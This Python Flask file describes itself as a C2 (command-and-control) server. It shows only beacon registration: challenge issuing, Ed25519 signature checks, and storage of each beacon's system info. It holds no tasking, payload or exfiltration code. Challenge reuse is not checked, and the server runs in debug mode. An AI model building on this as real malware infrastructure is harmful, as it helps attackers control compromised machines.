"""
Implementation of a C2 Server using Python.
"""

from flask import Flask, request

import secrets
import uuid
import base64
import json

from datetime import datetime
from zoneinfo import ZoneInfo


from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
from cryptography.exceptions import InvalidSignature

from db_manager import get_session, Beacon, Challenge

app = Flask(__name__)


def generate_new_challenge():
    challenge_id = uuid.uuid4()
    challenge = secrets.token_bytes(32)
    challenge_base64 = base64.b64encode(challenge).decode("utf-8")

    return {"challenge_id": challenge_id, "challenge": challenge_base64}


@app.route("/api/register/start", methods=["POST"])
def register_agent():
    "Receive the initial request from the beacon and send a challenge for verification."
    challenge_generated = generate_new_challenge()

    with get_session() as session:
        challenge = Challenge(
            challenge_id=str(challenge_generated["challenge_id"]),
            challenge=challenge_generated["challenge"],
        )
        session.add(challenge)
        session.commit()

    return challenge_generated


@app.route("/api/register/verify-challenge-response", methods=["POST"])
def verify_challenge():
    beacon_id = request.json["beacon_id"]

    challenge_id = request.json["challenge_id"]

    with get_session() as session:
        challenge = session.get(Challenge, challenge_id).challenge

    challenge_signature = request.json["challenge_signature"]

    public_key_hex = request.json['public_key']

    public_key_bytes = bytes.fromhex(public_key_hex)

    public_key = Ed25519PublicKey.from_public_bytes(public_key_bytes)

    system_info = json.dumps(request.json["system_info"])

    try:
        verify = public_key.verify(
            base64.b64decode(challenge_signature), base64.b64decode(challenge)
        )
        with get_session() as session:
            update_challenge = (
                session.query(Challenge)
                .filter(Challenge.challenge_id == challenge_id)
                .first()
            )
            update_challenge.used = True

            current_timestamp = datetime.now(ZoneInfo("Asia/Kolkata"))

            beacon = Beacon(
                id=beacon_id,
                public_key=public_key_hex,
                system_info=system_info,
                registered_at=current_timestamp,
                last_active=current_timestamp,
                status="online",
            )

            session.add(beacon)

            session.commit()

        return {"verified": True}, 200

    except InvalidSignature:
        return {"verified": False}, 401


if __name__ == "__main__":
    app.run(debug=True, port=4999)
